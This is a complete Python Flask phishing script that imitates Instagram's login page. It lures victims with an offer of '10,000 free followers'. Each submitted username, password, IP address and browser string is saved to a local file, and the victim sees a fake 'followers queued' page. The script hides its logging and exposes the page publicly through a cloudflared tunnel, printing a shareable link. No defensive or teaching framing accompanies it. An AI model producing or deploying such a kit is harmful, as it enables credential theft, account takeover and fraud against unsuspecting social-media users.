import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'instagram-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Instagram Followers")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['ig_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Get Free Instagram Followers</title>
        <style>
            :root {
                --ig-primary: #0095f6;
                --ig-secondary: #385185;
            }
            
            body {
                background: #fafafa;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #262626;
            }
            
            .login-box {
                background: white;
                border: 1px solid #dbdbdb;
                width: 350px;
                padding: 40px;
                text-align: center;
                margin-bottom: 10px;
            }
            
            .ig-logo {
                font-family: 'Billabong', cursive;
                font-size: 48px;
                margin: 20px 0;
                background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            
            .promo-banner {
                background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976);
                color: white;
                padding: 15px;
                border-radius: 8px;
                margin: 20px 0;
                font-weight: 600;
            }
            
            .follower-count {
                font-size: 24px;
                font-weight: bold;
                color: #d62976;
                margin: 10px 0;
            }
            
            input {
                width: 100%;
                padding: 12px;
                margin: 8px 0;
                border: 1px solid #dbdbdb;
                border-radius: 3px;
                background: #fafafa;
                font-size: 14px;
                box-sizing: border-box;
            }
            
            input:focus {
                border-color: #a8a8a8;
                outline: none;
            }
            
            .login-btn {
                background: var(--ig-primary);
                color: white;
                border: none;
                padding: 8px;
                border-radius: 4px;
                font-weight: 600;
                width: 100%;
                margin: 8px 0;
                cursor: pointer;
            }
            
            .login-btn:hover {
                background: #0081d6;
            }
            
            .separator {
                display: flex;
                align-items: center;
                margin: 15px 0;
                color: #8e8e8e;
                font-size: 13px;
                font-weight: 600;
            }
            
            .separator::before, .separator::after {
                content: '';
                flex: 1;
                border-bottom: 1px solid #dbdbdb;
            }
            
            .separator::before {
                margin-right: 10px;
            }
            
            .separator::after {
                margin-left: 10px;
            }
            
            .fb-login {
                color: var(--ig-secondary);
                font-weight: 600;
                text-decoration: none;
                margin: 10px 0;
                display: block;
            }
            
            .forgot-pw {
                color: #00376b;
                text-decoration: none;
                font-size: 12px;
                margin: 15px 0;
            }
            
            .signup-box {
                background: white;
                border: 1px solid #dbdbdb;
                width: 350px;
                padding: 20px;
                text-align: center;
                font-size: 14px;
            }
            
            .signup-box a {
                color: var(--ig-primary);
                text-decoration: none;
                font-weight: 600;
            }
        </style>
    </head>
    <body>
        <div style="display: flex; flex-direction: column; align-items: center;">
            <div class="login-box">
                <div class="ig-logo">Instagram</div>
                
                <div class="promo-banner">
                    🎉 LIMITED TIME OFFER 🎉
                </div>
                
                <div class="follower-count">10,000 FREE FOLLOWERS</div>
                <div style="font-size: 14px; color: #8e8e8e; margin-bottom: 20px;">
                    Login to claim your free followers instantly!
                </div>
                
                <form action="/login" method="post">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit" class="login-btn">Get Free Followers</button>
                </form>
                
                <div class="separator">OR</div>
                
                <a href="#" class="fb-login">
                    <i>📘</i> Log in with Facebook
                </a>
                
                <a href="#" class="forgot-pw">Forgot password?</a>
            </div>
            
            <div class="signup-box">
                Don't have an account? <a href="#">Sign up</a>
            </div>
        </div>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('ig_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Processing Your Followers - Instagram</title>
        <style>
            body {
                background: #fafafa;
                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .container {
                text-align: center;
                background: white;
                padding: 40px;
                border-radius: 8px;
                border: 1px solid #dbdbdb;
                max-width: 400px;
            }
            .success-icon {
                font-size: 64px;
                margin: 20px 0;
            }
            .processing-bar {
                width: 100%;
                height: 4px;
                background: #dbdbdb;
                border-radius: 2px;
                margin: 20px 0;
                overflow: hidden;
            }
            .processing-fill {
                height: 100%;
                background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976);
                animation: processing 3s infinite;
            }
            @keyframes processing {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            .follower-update {
                background: #e6f4ea;
                border: 1px solid #34a853;
                border-radius: 6px;
                padding: 15px;
                margin: 20px 0;
            }
        </style>
        <meta http-equiv="refresh" content="5;url=/" />
    </head>
    <body>
        <div class="container">
            <div class="success-icon">✨</div>
            <h2>Followers Processing!</h2>
            <div class="processing-bar">
                <div class="processing-fill"></div>
            </div>
            <div class="follower-update">
                <strong>10,000 followers queued!</strong><br>
                Your followers will be delivered within 24 hours.
            </div>
            <p>Redirecting to Instagram...</p>
        </div>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"Free Followers Public Link: {tunnel_url}")
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5000")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        sys.exit(0)